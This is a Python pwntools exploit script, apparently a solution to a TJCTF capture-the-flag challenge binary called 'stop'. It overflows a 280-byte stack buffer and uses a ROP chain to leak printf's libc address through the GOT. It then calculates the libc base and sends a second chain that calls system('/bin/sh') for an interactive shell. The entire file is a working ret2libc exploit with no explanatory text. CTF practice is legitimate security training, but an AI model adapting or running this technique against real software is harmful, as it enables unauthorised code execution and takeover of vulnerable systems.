from pwn import *

# sh=remote("p1.tjctf.org",8001)
sh=process("./stop")

# libc=ELF("libc6_2.27-3ubuntu1_amd64.so")
libc=ELF("/usr/lib/x86_64-linux-gnu/libc-2.30.so")

exe=ELF("stop")

p= 'a'*280 
p+=p64(0x0000000000400953) 		# pop rdi
p+=p64(exe.got["printf"]) 		# printf got
p+=p64(0x000000000040056e) 		# ret
p+=p64(exe.plt["printf"]) 		# printf plt
p+=p64(0x000000000040056e) 		# ret
p+=p64(exe.sym["main"])

sh.sendline("a")
sh.sendlineafter("gory? ",p)

sh.recvuntil("yet\n")
leak=u64(sh.recv(6).ljust(8,"\x00"))
base_libc=leak - libc.sym['printf']
system = base_libc + libc.sym['system']
bin_sh = base_libc + libc.search("/bin/sh").next()

log.info(hex(base_libc))
log.info(hex(system))

p= 'a'*280
p+= p64(0x0000000000400953)		# pop rdi
p+= p64(bin_sh) 
p+= p64(0x000000000040056e)		# ret
p+= p64(system)

sh.sendline("a")
sh.sendline(p)

sh.interactive()
